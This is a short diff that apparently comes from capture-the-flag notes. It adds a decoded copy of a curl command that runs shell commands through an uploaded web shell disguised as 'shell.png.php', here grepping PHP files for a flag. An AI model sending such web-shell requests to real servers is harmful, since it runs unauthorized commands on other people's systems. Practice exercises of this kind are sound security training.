@@ -1,1 +1,3 @@
 curl http://travel.rogue-sentinels.io:80/salmon-uploads/shell.png.php?cmd=cd%20..%20%26%26%20grep%20-H%20%22FLAG%22%20*.php
+
+# curl "http://travel.rogue-sentinels.io:80/salmon-uploads/shell.png.php?cmd=cd .. && grep -H "FLAG" *.php" (url decoded for clarity)
